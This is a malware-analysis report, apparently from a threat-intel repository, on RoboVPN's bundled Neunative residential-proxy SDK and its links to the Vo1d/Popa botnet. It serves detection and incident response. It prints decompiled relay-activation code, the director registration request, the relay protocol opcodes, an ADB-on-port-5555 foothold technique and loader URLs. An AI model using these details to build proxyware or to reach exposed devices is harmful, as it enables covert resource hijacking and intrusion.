---
date: 2026-06-28
title: "RoboVPN / Neunative: A Free VPN That Ships a Residential-Proxy Botnet SDK on the Vo1d/Popa Backend"
clusters: ["Vo1d/Popa proxy operator", "Cyberkick Ltd. (RoboVPN)"]
cluster_country: "Unattributed operator; proxy network publicly linked to NetNut / Alarum Technologies (NASDAQ)"
techniques_enterprise: [T1195.002, T1583.005, T1584.005, T1496.002, T1090.002, T1090.003, T1071.001, T1095, T1571, T1573.002, T1036.005, T1027.009, T1133, T1498]
techniques_ics: []
platforms: [windows, iot, supply-chain]
sectors: [consumer, telecom, media, cross-sector]
category: malware-re
---

# RoboVPN / Neunative: A Free VPN That Ships a Residential-Proxy Botnet SDK on the Vo1d/Popa Backend

## TL;DR

RoboVPN is a functional, free Windows VPN published by Cyberkick Ltd. Bundled in the same installer as a NuGet dependency, and listed in `RoboVPN.deps.json` next to Newtonsoft.Json and the AWS SDK as if it were routine plumbing, is **Neunative** — a residential-proxy SDK that turns the user's machine into an exit node for arbitrary third-party traffic. The wiring is inverted on purpose: the relay activates when the VPN is *idle or disconnected* (so traffic exits through the user's real residential IP) and is stopped the moment the tunnel comes up. Nokia Deepfield ERT reverse-engineered the Windows build on **2026-06-18** and showed the same director domain (`gmslb[.]net`) and tunnel protocol already front the **Vo1d/Popa** Android-TV proxy botnet (XLab counted ~1.6M devices in March 2025); the same proxy network has been publicly linked by Qurium, Synthient and KrebsOnSecurity to **NetNut**, owned by NASDAQ-listed **Alarum Technologies**. This matters today because residential-proxy SDKs, Android supply-chain malware and DDoS/L7 attack infrastructure have stopped being separate problems — a weak destination filter in the relay (`0.0.0.0/8` and port 5555 left unblocked) turns each exit node into both an abuse surface and an initial-access foothold.

## Attribution and confidence

| Layer | Cluster / entity | Aliases / overlap | Confidence |
|---|---|---|---|
| Proxy SDK / backend | Neunative SDK platform; director `gmslb[.]net` | Same backend as **Vo1d/Popa** Android-TV proxy (XLab "Popa", Dr.Web "Vo1d") | high (technical: shared director + TLV protocol, recovered from RTTI) |
| Windows publisher | Cyberkick Ltd. (RoboVPN) | publisher/affiliate tag `RoboVPN` passed to the SDK | high (binary RE) |
| Proxy network commercialization | NetNut residential proxy | owned by **Alarum Technologies** (NASDAQ: ALAR) | medium (multi-source: Qurium + Synthient + KrebsOnSecurity; company-disputed) |

Confidence is **high** for the mechanism and IOCs — Nokia Deepfield ERT's analysis is entirely static (MSI unpacking, .NET single-file bundle extraction, ILSpy decompilation, Ghidra disassembly of the native x64 DLL) with live registration probes confirming the relay fleet. Confidence is **medium** for the NetNut/Alarum commercial attribution, which rests on independent reporting rather than a single forensic chain and is disputed by the named company. The Windows build is one publisher; the SDK's affiliate-tag design ("publisher name") indicates a platform that rents proxy capacity to many embedding apps (the SDK has also been reported inside pirated streaming apps, the MediaGet torrent client and the SmartTube Android-TV client).

Genealogy with previous repo cases: this is the first repo case anchored on a residential-proxy botnet / proxyware platform (slot #21). It complements but does not overlap the SRG/Luna Moth fast-flux case (Day 58, where compromised CPE relayed C2 as an *adversary-built* flux net) and the various cases that merely note residential-proxy egress as an exfil channel (Day 55 Icarus/Klue, Day 56 BlackFile). Here the residential-proxy network *is* the subject.

## Kill chain — summary table

| Stage | MITRE | Detail |
|---|---|---|
| Distribution | T1195.002 | Proxy SDK shipped inside a free consumer VPN (and other consumer apps) as a NuGet dependency presented as routine plumbing. |
| Install / enrollment | T1036.005 · T1027.009 | 12 MB .NET 6 single-file bundle (57 Deflate-compressed assemblies) + 4 native DLLs; nothing in the manifest marks the exit-node component. |
| Activation (inverted) | T1496.002 | `OpenPeer()` fires from the idle/disconnected UI paths, not on connect; relay exits through the user's residential IP only while the VPN is **off**. |
| Registration | T1071.001 · T1573.002 | TLS GET to director `lb.gmslb[.]net:443` `/regdev?...&sdkv=8.0.36&inst=...`, UA `SDK`; server geolocates the egress IP and returns a geo-relevant relay catalog. |
| Relay (C2) | T1095 · T1571 · T1090.002/.003 | Proprietary binary TLV protocol over TLS to `sN.<front>[.]com:6000` (~360 relays, ~30 front domains); `OpenTunnel` opcode `0xa070` carries target host/port chosen by the proxy customer. |
| Resource hijacking | T1496.002 · T1090 | Each `OpenTunnel` spawns a worker thread that resolves and dials the customer-supplied target; the user's bandwidth and IP carry third-party traffic. |
| Foothold / lateral | T1133 · T1584.005 | Destination filter blocks RFC1918/loopback but not `0.0.0.0/8` (→ loopback on Linux/Android) nor port 5555; `OpenTunnel("0.0.0.0",5555)` reaches the exit device's own ADB daemon and recruits it. |
| Downstream impact | T1498 · T1583.005 | The recruited fleet is reused for L7 DDoS and loader delivery (Synthient/Infoblox observed Popa nodes fetching Potassium/Gafgyt/IranBot loaders). |

![RoboVPN/Neunative kill chain](./kill_chain.svg)

The diagram is a two-lane view. The left lane is the user's Windows host walked stage by stage: a clean-looking VPN install, the inverted activation where idling turns the relay *on*, registration to the director, and the relay carrying third-party traffic out through the residential IP. The right lane is the operator infrastructure — the `gmslb[.]net` director, the ~360-relay fleet on rotating front domains, the proxy customers who pick destinations, and the shared Vo1d/Popa Android-TV backend that proves the two device populations sit on one platform. Detection anchors at the bottom map each artifact in this folder to a stage: the relay's non-standard port 6000 and the director registration are the network anchors; the registry/log/service host indicators are the endpoint anchors; the `0.0.0.0:5555` ADB path is the lateral anchor.

## Stage-by-stage detail

### Distribution — proxy SDK as a NuGet dependency (T1195.002)

The Neunative SDK ships as a NuGet package, `NeunativeNG/8.0.36`, bundling a .NET wrapper plus a platform-specific native binary under `runtimes/win-x64/native/NeunativeWin.dll`. The dependency is declared in `RoboVPN.deps.json` alongside Newtonsoft.Json and the AWS SDK — "a name, a version, a hash" — with nothing marking it as the component that turns the user into an exit node. The native binary's PDB path is rooted in a tree literally named `android-native-sdk`, and the same director (`gmslb[.]net`) already fronts the Vo1d/Popa proxy on its Android-TV fleet: one SDK platform, many publishers, multiple OS targets.

### Install / enrollment — single-file bundle hides the SDK (T1036.005, T1027.009)

```
RoboVPN.msi            ea40641a…  Installer (Cyberkick Ltd.; WiX 3.14, built 2024-03-31)
RoboVPN.dll            d7d37ce6…  WPF application (UI, connection lifecycle)
RoboVPN.Connector.Core.dll  4098f6a4…  VPN connectors, auth, ProxyService
NeunativeNG.dll        74beab8a…  .NET shim over native SDK (NuGet NeunativeNG 8.0.36)
NeunativeWin.dll       6f686ba6…  Native x64 C++ proxy SDK (598 functions)
```

The MSI carries a .NET 6 self-contained single-file bundle (57 Deflate-compressed assemblies) plus four native x64 DLLs packed into a single 12 MB executable. Scanning the raw EXE for strings finds almost nothing; the assemblies must be decompressed first — a casual static triage of the EXE looks clean.

### Activation — the relay runs when the VPN is OFF (T1496.002)

The .NET layer decompiles to near-original C# (the PDB ships with the app). In `RoboVPN.Connector.Core.Proxy`:

```csharp
public static void OpenPeer()
{
    int val = new Random().Next(30, 91) * 60;   // 30-90 minutes
    Neunative.setParameterInt("start_delay_sec", val);
    Neunative.startNeuNative("RoboVPN");          // publisher/affiliate tag
}
```

`OpenPeer()` is **not** called on connect. It is called from `DisconnectedDisplay()` (the idle "Quick connect to" screen), on Disconnect, on Cancel, and after login (`toMain()`). `ClosePeer()` → `stopNeuNative()` is called from `Connect()`. The mapping is the reverse of the intuitive one: connecting the VPN stops the proxy; disconnecting or idling starts it. Because the WireGuard tunnel is full-tunnel (`AllowedIPs = 0.0.0.0/0`), a relay running while connected would exit through RoboVPN's own datacenter servers — useless as a *residential* proxy and self-attributing — so it only runs while the VPN is down, guaranteeing it exits through the user's real residential IP. The 30-to-90-minute random delay also defeats short analysis windows: capture for thirty minutes after connecting and you see WireGuard and nothing else.

### Registration — director hands back a geo-relevant relay catalog (T1071.001, T1573.002)

The SDK contacts `lb.gmslb[.]net:443` over TLS with a registration GET whose `Accept` header is a pixel-perfect Chrome impersonation but whose `User-Agent` is the three-character string `SDK`:

```
GET /regdev?usr=<uuid>&userid=<uuid>&dev_ip=<ip>&sdkv=8.0.36&inst=<uuid> HTTP/1.1
User-Agent: SDK
Host: lb.gmslb.net:443
```

The `usr`/`userid` UUIDs are generated once with `UuidCreate` and persisted at `HKCU\Software\Neunative\_uuid`; `inst` identifies the install. The server (nginx/1.20.1, Express) ignores the client-supplied `dev_ip`, geolocates the source IP itself, and returns the device's `dev_asn`/`dev_city`/`dev_country`/`dev_state` plus a `peer_servers` list — the exit node's catalog entry, i.e. the "location" a proxy customer selects. Enumerating the `sN` hostname pattern reveals the full fleet of **~360 relays** across ~30 front domains (`viki-play[.]com`, `star-layer[.]com`, and others).

### Relay — proprietary TLV protocol on port 6000 (T1095, T1571, T1090)

For each peer server the SDK opens a TLS connection to port **6000** and speaks a proprietary binary protocol framed with 4-byte big-endian type codes (recovered from RTTI: `SdkProtocolMessage{Long,Int,String,Byte,Blob}TLV`):

```
0x5060  Register          device registration
0x7070  RegisterResponse  Byte (0x9080)
0x9010  Ping              Long (0xa020), keepalive
0xa070  OpenTunnel        Long 0x70a1=tunnel id, String 0x70a2=target host, Int 0x70a3=target port
0xc000  TunnelMessage     relayed payload bytes
0xcccc  CloseTunnel       Long 0xc111=tunnel id
0xdddd  Goodbye           -
```

XLab named these message types 1–8 from the Popa side; the exact opcodes/tags above are the Windows build's, recovered from RTTI — the same backend, documented at the byte level. Each `OpenTunnel` spawns a dedicated worker (`_beginthreadex`, logged `Tunnel%llu`), resolves the server-supplied target with `getaddrinfo`, connects, and relays bytes bidirectionally. The proxy customer picks the destination; the user's machine dials it.

### Foothold / lateral — the destination filter's two gaps (T1133, T1584.005)

Before connecting, the resolved target IP is checked against RFC1918 (`10/8`, `172.16/12`, `192.168/16`), loopback (`127/8`), link-local (`169.254/16`) and multicast/reserved (`>=224`); private targets are nulled. The filter keeps customers out of the user's LAN but does nothing to keep them off the user's public IP — and it is a denylist that misses two ranges. `0.0.0.0/8` maps to loopback on Linux/Android, so `OpenTunnel("0.0.0.0",5555)` passes every check and reaches the exit device's own **ADB daemon** — the exact initial-access path Synthient documented, with `:5555` ranking third-busiest outbound port across the Popa fleet. The second miss is CGN shared space (`100.64.0.0/10`), reachable on some carrier networks. There is no port blocklist at all.

### Downstream impact — proxy fleet feeds DDoS and loader delivery (T1498, T1583.005)

Synthient (with Infoblox) observed Popa nodes fetching botnet loaders the DDoS-tracking community already follows: `117.55.203[.]189/jewishgoldowner/arm7` (Potassium), `195.178.110[.]204/adb` (a Gafgyt/NeTiS loader) and `83.168.110[.]191` serving `iran.*` (IranBot). Qurium traces L7 attacks on the independent-media outlets it protects back to commercial proxy/VPN providers. The exit-node-to-foothold-to-botnet path is observed traffic, not a hypothetical.

## RE notes

| Component | SHA256 | Lang | Packer | Notes |
|---|---|---|---|---|
| RoboVPN.msi | ea40641a086bfa4e077b066e2f2e92e6c5d777153aea2bb5405382b8b513ae0d | WiX 3.14 MSI | — | Cyberkick Ltd.; built 2024-03-31 |
| NeunativeWin.dll | 6f686ba628de3bf1ebfb8504e2e966334b02505c546bb9d2ad020f5f5d1d01b7 | C++ x64 | — | 598 functions; registration + TLV tunnel relay; PDB tree `android-native-sdk` |
| NeunativeNG.dll | 74beab8ae664958742f6c5d33c1a50bd06d4137147e42c0b94b7be2f8ec98ebb | .NET | — | P/Invoke shim; NuGet NeunativeNG 8.0.36 |
| RoboVPN.Connector.Core.dll | 4098f6a407b7dd8ddb3a30b225255ba9e9035136e6eabfde208242d73c88ecb5 | .NET | single-file bundle | contains `ProxyService`, `OpenPeer()`/`ClosePeer()` |
| RoboVPN.dll | d7d37ce6f7bdaf6e7ddd6e3a89ff930b79672f30378367121fcee6cc61f2334c | .NET WPF | single-file bundle | UI / connection lifecycle |

Anti-analysis is not packing but *timing and placement*: the SDK is a normal-looking NuGet dependency, the EXE strings are hidden behind Deflate compression in the single-file bundle, and the relay's 30-90 minute activation delay outlasts a typical sandbox/Wireshark window. The native exports are minimal (`startNeuNative`, `stopNeuNative`, `setParameter{String,Int,Bool,Long}`), pushing all control into server-issued TLV messages, so the binary itself reveals little about what traffic will be relayed.

## Detection strategy

### Telemetry that matters

Windows endpoints: Sysmon EID 1 (process create — VPN client + child resolver behavior), EID 3 (network connection — TLS to port 6000 and to the director), EID 7 (image load of `NeunativeWin.dll`/`NeunativeNG.dll`), EID 12/13 (registry create/set under `HKCU\Software\Neunative`), EID 11 (file create of `%AppData%\NeuNative.log` / `logNeunative.txt`), EID 22 (DNS query for `gmslb[.]net` and relay front domains). Defender XDR: `DeviceNetworkEvents`, `DeviceProcessEvents`, `DeviceImageLoadEvents`, `DeviceRegistryEvents`, `DeviceFileEvents`. Network/firewall: Sentinel `CommonSecurityLog` / Zeek `conn.log` + `ssl.log` for outbound TLS to non-standard port 6000 and to the director. For the Android-TV/IoT population the host has no EDR — the only signal is network: DNS to `gmslb[.]net`, TLS:6000 egress, and inbound/loopback hits on ADB `:5555`.

### Detection coverage

| Engine | File | Logic |
|---|---|---|
| Sigma | sigma/neunative_director_registration_useragent.yml | Outbound HTTP(S) registration to `/regdev` with UA `SDK` and `sdkv=` query — director enrollment. |
| Sigma | sigma/neunative_proxy_dll_load_and_registry.yml | Image load of `NeunativeWin.dll`/`NeunativeNG.dll` or registry write under `HKCU\Software\Neunative`. |
| Sigma | sigma/proxyware_nonstandard_port6000_beacon.yml | Process-initiated network connection to remote port 6000 from a non-browser binary — relay beacon. |
| KQL | kql/neunative_director_registration.kql | `DeviceNetworkEvents`/`DeviceFileEvents` — director domain + `/regdev` + UA `SDK`. |
| KQL | kql/neunative_dll_image_load.kql | `DeviceImageLoadEvents` — Neunative native/shim DLL load by any process. |
| KQL | kql/proxyware_port6000_relay_beacon.kql | `DeviceNetworkEvents` — repeated TLS:6000 connections to rotating remote hosts. |
| KQL | kql/adb_loopback_5555_exposure.kql | `DeviceNetworkEvents` — connections to `0.0.0.0`/loopback:5555 (ADB exposure on the exit node). |
| YARA | yara/neunative_proxy_sdk.yar | Native + .NET SDK artifacts: exports, director string, registry/log paths, TLV opcodes. |
| Suricata | suricata/neunative_proxy.rules | Director registration GET (`/regdev` + UA `SDK`), TLS to port 6000, ADB `:5555` reach. |

### Threat hunting hypotheses

H1 (`hunts/peak_h1_director_registration_beacon.md`): if a host runs the Neunative SDK, the proxy DNS/HTTP telemetry will show enrollment to `gmslb[.]net` `/regdev?...sdkv=8.0.36...` with UA `SDK`, followed within 30-90 minutes by repeated TLS to port 6000 against rotating `sN.<front>.com` hosts — a beacon-then-relay shape distinct from any browser.

H2 (`hunts/peak_h2_vpn_idle_proxy_activation.md`): a "VPN" process whose outbound relay activity *increases* when the tunnel interface is down (and stops when it is up) inverts normal VPN behavior; correlate WireGuard service state (`RoboVPN_WG0`) with port-6000 egress to surface proxyware whose on-state is the user's off-state.

H3 (`hunts/peak_h3_adb_5555_exit_node_foothold.md`): on the exit-node population, hunt for connections targeting `0.0.0.0`/loopback on port 5555 (ADB) — the destination-filter gap that turns a proxy node into an initial-access foothold and a botnet recruit.

## Incident response playbook

### First 60 minutes (triage)

1. Identify whether the flagged host runs RoboVPN or any app embedding the Neunative SDK (image load of `NeunativeWin.dll`/`NeunativeNG.dll`; presence of `HKCU\Software\Neunative`).
2. Confirm network behavior: DNS to `gmslb[.]net`, HTTPS `/regdev` registration, and outbound TLS to remote port 6000.
3. Determine the activation state — note that the relay runs while the VPN is *disconnected/idle*, so "the VPN is off" is not reassurance.
4. On IoT/Android-TV nodes, check for ADB exposure (port 5555) and any inbound exploitation following relay activity.
5. Scope: pivot on the director and port-6000 destinations across the fleet to find other enrolled hosts.

### Artifacts to collect

| Artifact | Path | Tool | Why |
|---|---|---|---|
| Registry UUID | `HKCU\Software\Neunative\_uuid` | reg.exe / Autoruns | Proves SDK enrollment + install identity. |
| SDK logs | `%AppData%\NeuNative.log`, `%AppData%\logNeunative.txt` | file copy | Relay activity, tunnel IDs (`Tunnel%llu`). |
| Loaded modules | `NeunativeWin.dll`, `NeunativeNG.dll` | Sysmon EID 7 / process dump | Confirms the proxy SDK in memory. |
| Net flows | conn.log / firewall | Zeek / SIEM | Director registration + port-6000 relay destinations. |
| Installer | `RoboVPN.msi` (`ea40641a…`) | hash + quarantine | Source of the bundled SDK. |

### IR queries and commands

```powershell
# Enrollment + logs
reg query "HKCU\Software\Neunative" /s 2>$null
Get-ChildItem "$env:APPDATA" -Filter "*eunative*" -ErrorAction SilentlyContinue
Get-Process | Where-Object { $_.Modules.ModuleName -match 'Neunative' } |
  Select-Object Name, Id
# WireGuard service used as the VPN front
Get-Service | Where-Object { $_.Name -match 'RoboVPN_WG' }
```

```bash
# Network side (host with packet capture / on a router)
# Director enrollment + relay port; refang before use
#   director:  lb.gmslb[.]net  ->  lb.gmslb.net
ss -tnp | grep ':6000'                 # active relay connections
# IoT exit node: is ADB exposed?
ss -tlnp | grep ':5555'
```

```kql
DeviceNetworkEvents
| where RemoteUrl has "gmslb.net" or RemotePort == 6000
| summarize count(), make_set(RemoteUrl, 20), make_set(RemotePort, 10) by DeviceName, InitiatingProcessFileName
```

### Containment, eradication, recovery

Uninstall RoboVPN and any embedding app; remove `HKCU\Software\Neunative` and the `%AppData%` log files; block the director (`gmslb[.]net`) and the relay front domains at DNS/egress. On the IoT/Android-TV population, disable ADB over TCP (`setprop persist.adb.tcp.port -1` / factory-reset compromised boxes) and block port 5555 at the perimeter. **What NOT to do:** do not treat "the VPN is disconnected" as safe — that is precisely the relay's on-state. Do not rely on IP blocking of relays alone — the fleet rotates ~360 hosts across ~30 front domains; block on the director domain and the port-6000 behavior. Exit criteria: no SDK modules loaded, no `/regdev` registration, no port-6000 egress for 7 days.

### Recovery validation

Confirm absence of `HKCU\Software\Neunative`, no `NeunativeWin.dll`/`NeunativeNG.dll` loads, no DNS resolution of `gmslb[.]net`, and no outbound TLS to port 6000 across the monitored window. For exit-node IoT devices, verify ADB-over-TCP is disabled and port 5555 is unreachable from the LAN.

## IOCs

| Type | Value | Context | Confidence | Source |
|---|---|---|---|---|
| sha256 | ea40641a086bfa4e077b066e2f2e92e6c5d777153aea2bb5405382b8b513ae0d | RoboVPN.msi installer (Cyberkick Ltd.) | high | Nokia Deepfield ERT 2026-06-18 |
| sha256 | 6f686ba628de3bf1ebfb8504e2e966334b02505c546bb9d2ad020f5f5d1d01b7 | NeunativeWin.dll native x64 proxy SDK | high | Nokia Deepfield ERT 2026-06-18 |
| sha256 | 74beab8ae664958742f6c5d33c1a50bd06d4137147e42c0b94b7be2f8ec98ebb | NeunativeNG.dll .NET shim (NuGet 8.0.36) | high | Nokia Deepfield ERT 2026-06-18 |
| sha256 | 4098f6a407b7dd8ddb3a30b225255ba9e9035136e6eabfde208242d73c88ecb5 | RoboVPN.Connector.Core.dll (ProxyService) | high | Nokia Deepfield ERT 2026-06-18 |
| sha256 | d7d37ce6f7bdaf6e7ddd6e3a89ff930b79672f30378367121fcee6cc61f2334c | RoboVPN.dll main WPF app | high | Nokia Deepfield ERT 2026-06-18 |
| domain | lb.gmslb[.]net | Director / load balancer (registration); shared with Vo1d/Popa | high | Nokia Deepfield ERT / XLab |
| domain | gmslb[.]net | Director apex (hardcoded Popa C2) | high | XLab 2025-03 / Nokia Deepfield |
| domain | viki-play[.]com | Relay fleet front domain | high | Nokia Deepfield ERT 2026-06-18 |
| domain | star-layer[.]com | Relay fleet front domain | high | Nokia Deepfield ERT 2026-06-18 |
| url | /regdev?usr=&userid=&dev_ip=&sdkv=8.0.36&inst= | Registration request path | high | Nokia Deepfield ERT 2026-06-18 |
| string | User-Agent: SDK | Registration user-agent | high | Nokia Deepfield ERT 2026-06-18 |
| string | sN.<front>.com:6000 | Relay hostname pattern (~360 relays, ~30 fronts) | high | Nokia Deepfield ERT 2026-06-18 |
| regkey | HKCU\Software\Neunative | SDK UUID persistence (_uuid) | high | Nokia Deepfield ERT 2026-06-18 |
| path | %AppData%\NeuNative.log | SDK log file | high | Nokia Deepfield ERT 2026-06-18 |
| path | %AppData%\logNeunative.txt | SDK log file | high | Nokia Deepfield ERT 2026-06-18 |
| ipv4 | 117.55.203.189 | Potassium loader host pushed via Popa LAN exploitation (decaying) | medium | Synthient + Infoblox 2026-06 |
| ipv4 | 195.178.110.204 | Gafgyt/NeTiS loader host (/adb) via Popa nodes (decaying) | medium | Synthient + Infoblox 2026-06 |
| ipv4 | 83.168.110.191 | IranBot loader host (iran.*) via Popa nodes (decaying) | medium | Synthient + Infoblox 2026-06 |

No CVE is associated with this case — it is a design/abuse and supply-chain case, not a vulnerability exploit, so no `kev.md` is generated. The ADB `0.0.0.0:5555` foothold is a configuration/filter gap, not a CVE. The three loader IPs are downstream context observed by Synthient/Infoblox and decay quickly; re-validate before blocking as live. Full machine-readable list in `iocs.csv`; the upstream relay fleet (~360 hosts) is published by Nokia Deepfield in `popa/iocs/relays.csv`.

## Secondary findings

- **Supply-chain distribution beyond RoboVPN.** The Neunative SDK's affiliate-tag design ("publisher name" passed to `startNeuNative`) indicates a platform renting proxy capacity to many embedding apps; the same proxy code has been reported inside pirated streaming apps, the MediaGet torrent client and the SmartTube Android-TV YouTube client. One detection (DLL load + director registration) covers every publisher.
- **Terms-vs-behavior gap.** RoboVPN's T&Cs disclose a "peer" IP-sharing model with a promised opt-out "at any time," but the binary exposes no toggle (`setParameterBool` is unused), `OpenPeer()` fires unconditionally from idle/disconnected/login paths, and the only stop is connecting the VPN. Consent — the line between a proxy service and a botnet — is the one thing the backend never checks: it serves the same relay list whether a device was enrolled by EULA or by malware.
- **One backend, two device populations.** Dr.Web (Sep 2024) found Vo1d on ~1.3M Android-TV boxes; XLab (Mar 2025) documented the Popa proxy plugin on ~1.6M with `gmslb[.]net` hardcoded. The Windows RE proves the same director and TLV protocol now also runs on Windows endpoints — the network anchors (`gmslb[.]net`, port 6000) are OS-independent.

## Pedagogical anchors

- A residential proxy network and a botnet differ only by consent, and consent is exactly what these backends do not verify — treat any proxyware/relay SDK on a managed endpoint as unauthorized resource hijacking (T1496.002), not a grey-area utility.
- The most durable anchors here are behavioral and OS-independent: enrollment to a director domain and relay traffic on a fixed non-standard port (6000). The ~360-host relay fleet rotates and IP blocklists age out; the director domain and the port-6000 beacon do not.
- "The VPN is off, so we're safe" is exactly backwards for inverted proxyware — verify the activation logic, not the marketing. Reverse the activation paths (`OpenPeer()` from idle, `ClosePeer()` from connect) before declaring a sample clean, and let a sandbox run past the 30-90 minute delay.
- A denylist destination filter is a recurring failure mode: enumerate-and-miss left `0.0.0.0/8` and port 5555 open, turning each exit node into an ADB-reachable foothold. Allowlists, not denylists, for anything that resolves attacker-chosen hostnames.

## What's in this folder

| File | Purpose | Link |
|---|---|---|
| README.md | This analysis. | [README.md](./README.md) |
| kill_chain.svg | Two-lane kill-chain diagram (user host vs operator infrastructure). | [kill_chain.svg](./kill_chain.svg) |
| sigma/neunative_director_registration_useragent.yml | Sigma — director `/regdev` registration with UA `SDK`. | [view](./sigma/neunative_director_registration_useragent.yml) |
| sigma/neunative_proxy_dll_load_and_registry.yml | Sigma — Neunative DLL load / registry write. | [view](./sigma/neunative_proxy_dll_load_and_registry.yml) |
| sigma/proxyware_nonstandard_port6000_beacon.yml | Sigma — relay beacon to non-standard port 6000. | [view](./sigma/proxyware_nonstandard_port6000_beacon.yml) |
| kql/neunative_director_registration.kql | KQL — director domain + `/regdev` + UA `SDK`. | [view](./kql/neunative_director_registration.kql) |
| kql/neunative_dll_image_load.kql | KQL — Neunative DLL image load. | [view](./kql/neunative_dll_image_load.kql) |
| kql/proxyware_port6000_relay_beacon.kql | KQL — repeated TLS:6000 relay beacon. | [view](./kql/proxyware_port6000_relay_beacon.kql) |
| kql/adb_loopback_5555_exposure.kql | KQL — ADB `0.0.0.0`/loopback:5555 exposure on exit node. | [view](./kql/adb_loopback_5555_exposure.kql) |
| yara/neunative_proxy_sdk.yar | YARA — Neunative SDK native + .NET artifacts. | [view](./yara/neunative_proxy_sdk.yar) |
| suricata/neunative_proxy.rules | Suricata — registration GET, port 6000, ADB 5555. | [view](./suricata/neunative_proxy.rules) |
| hunts/peak_h1_director_registration_beacon.md | PEAK hunt H1 — director registration then port-6000 relay. | [view](./hunts/peak_h1_director_registration_beacon.md) |
| hunts/peak_h2_vpn_idle_proxy_activation.md | PEAK hunt H2 — proxy active while VPN is idle/down. | [view](./hunts/peak_h2_vpn_idle_proxy_activation.md) |
| hunts/peak_h3_adb_5555_exit_node_foothold.md | PEAK hunt H3 — ADB 5555 foothold on exit nodes. | [view](./hunts/peak_h3_adb_5555_exit_node_foothold.md) |
| iocs.csv | Machine-readable IOC list. | [iocs.csv](./iocs.csv) |

## Sources

- [Nokia Deepfield ERT — RoboVPN, Neunative, and the Vo1d/Popa backend (2026-06-18)](https://github.com/deepfield/public-research/blob/main/reports/2026-06-18-robovpn-neunative.md)
- [Nokia Deepfield — Popa relay fleet IOCs (relays.csv)](https://github.com/deepfield/public-research/blob/main/popa/iocs/relays.csv)
- [XLab (Qianxin) — Long Live the Vo1d Botnet (2025-03)](https://blog.xlab.qianxin.com/long-live-the-vo1d_botnet/)
- [Dr.Web — Void captures over a million Android TV boxes (2024-09)](https://news.drweb.com/show/?i=14900&lng=en)
- [Synthient — A Broken System: Fueling Botnets (2026-01)](https://synthient.com/blog/a-broken-system-fueling-botnets)
- [Synthient + Infoblox — Who Are the Victims of Residential Proxies (2026-06)](https://synthient.com/blog/who-are-the-victims-of-residential-proxies)
- [Qurium — Finding "Popa": When Your Smart TV Stops Being Yours](https://www.qurium.org/forensics/finding-popa/)
- [KrebsOnSecurity — 'Popa' Botnet Linked to Publicly-Traded Israeli Firm (2026-06)](https://krebsonsecurity.com/2026/06/popa-botnet-linked-to-publicly-traded-israeli-firm/)
- [Nokia — Residential-proxy botnets and DDoS, 2026 update](https://www.nokia.com/blog/one-year-later-the-residential-proxy-botnet-problem-got-bigger-not-smaller/)
